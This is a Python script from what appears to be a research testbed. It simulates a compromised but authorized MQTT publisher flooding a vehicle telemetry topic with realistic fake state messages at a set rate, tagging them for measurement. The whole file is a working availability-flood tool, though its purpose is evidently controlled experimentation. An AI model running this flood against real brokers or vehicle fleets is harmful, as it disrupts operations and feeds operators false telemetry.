#!/usr/bin/env python3

"""Controlled MQTT authorized-publisher availability flood.

Threat model:
A compromised but authorized MQTT publisher sends schema-valid telemetry
through the normal broker path at a sustained high rate. The payload schema
is identical to the legitimate vehicle publisher; attacker traffic is
distinguished by serial number and header-ID range.
"""

import argparse
import json
import ssl
import sys
import time
from pathlib import Path

import paho.mqtt.client as mqtt


TESTBED_DIR = Path(__file__).resolve().parents[1]
VEHICLES_DIR = TESTBED_DIR / "vehicles"

if str(VEHICLES_DIR) not in sys.path:
    sys.path.insert(0, str(VEHICLES_DIR))

from data_generator import make_reading


def build_client(
    *,
    client_id: str,
    username: str | None,
    password: str | None,
    tls: bool,
    ca_cert: str | None,
) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=client_id,
        protocol=mqtt.MQTTv311,
    )

    if username is not None:
        client.username_pw_set(
            username=username,
            password=password,
        )

    if tls:
        if not ca_cert:
            raise ValueError(
                "TLS enabled but no CA certificate provided"
            )

        client.tls_set(
            ca_certs=ca_cert,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLS_CLIENT,
        )

    return client


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Controlled authorized MQTT QoS0 "
            "availability flood."
        )
    )

    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)

    parser.add_argument(
        "--serial-number",
        default="VM-COMPROMISED",
    )

    parser.add_argument(
        "--topic",
        default=None,
        help=(
            "MQTT topic. If omitted, derived from "
            "the serial number."
        ),
    )

    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
    )

    parser.add_argument(
        "--rate",
        type=float,
        default=200.0,
        help="Target publish rate in messages per second.",
    )

    parser.add_argument(
        "--client-id",
        default="mqtt-harmonized-attacker",
    )

    parser.add_argument("--username")
    parser.add_argument("--password")

    parser.add_argument(
        "--tls",
        action="store_true",
    )

    parser.add_argument("--ca-cert")

    parser.add_argument(
        "--header-id-offset",
        type=int,
        default=1_000_000,
    )

    args = parser.parse_args()

    if args.duration <= 0:
        raise ValueError("duration must be > 0")

    if args.rate <= 0:
        raise ValueError("rate must be > 0")

    topic = (
        args.topic
        if args.topic
        else (
            "uagv/v2/OvGU-Testbed/"
            f"{args.serial_number}/state"
        )
    )

    client = build_client(
        client_id=args.client_id,
        username=args.username,
        password=args.password,
        tls=args.tls,
        ca_cert=args.ca_cert,
    )

    connected = False

    def on_connect(
        client,
        userdata,
        flags,
        reason_code,
        properties,
    ):
        nonlocal connected

        if reason_code == 0:
            connected = True

    client.on_connect = on_connect

    client.connect(
        args.host,
        args.port,
        keepalive=60,
    )

    client.loop_start()

    connect_deadline = time.monotonic() + 5.0

    while (
        not connected
        and time.monotonic() < connect_deadline
    ):
        time.sleep(0.05)

    if not connected:
        client.loop_stop()
        client.disconnect()
        raise RuntimeError(
            f"Could not connect to MQTT broker "
            f"{args.host}:{args.port}"
        )

    interval = 1.0 / args.rate
    start = time.monotonic()
    deadline = start + args.duration
    next_publish = start

    attempted = 0
    queued = 0

    try:
        while True:
            now = time.monotonic()

            if now >= deadline:
                break

            if now < next_publish:
                time.sleep(next_publish - now)

            # Use the exact legitimate telemetry generator.
            # Keep its normal sequence small so telemetry remains
            # realistic, then reserve a separate header-ID range
            # for attack accounting.
            payload = make_reading(
                attempted,
                serial_number=args.serial_number,
            )

            payload["headerId"] = (
                args.header_id_offset + attempted
            )

            encoded = json.dumps(
                payload,
                separators=(",", ":"),
            ).encode("utf-8")

            info = client.publish(
                topic,
                encoded,
                qos=0,
                retain=False,
            )

            attempted += 1

            if info.rc == mqtt.MQTT_ERR_SUCCESS:
                queued += 1
            else:
                print(
                    (
                        "publish_error "
                        f"rc={info.rc} "
                        f"sequence={attempted - 1}"
                    ),
                    flush=True,
                )

            next_publish += interval

    finally:
        elapsed = time.monotonic() - start

        client.loop_stop()
        client.disconnect()

        achieved_rate = (
            queued / elapsed
            if elapsed > 0
            else 0.0
        )

        print(
            json.dumps(
                {
                    "serial_number": args.serial_number,
                    "topic": topic,
                    "attempted_messages": attempted,
                    "queued_messages": queued,
                    "elapsed_s": round(elapsed, 6),
                    "target_rate_mps": args.rate,
                    "achieved_rate_mps": round(
                        achieved_rate,
                        6,
                    ),
                    "header_id_start": (
                        args.header_id_offset
                    ),
                    "header_id_end": (
                        args.header_id_offset
                        + attempted
                        - 1
                        if attempted
                        else args.header_id_offset
                    ),
                }
            ),
            flush=True,
        )


if __name__ == "__main__":
    main()
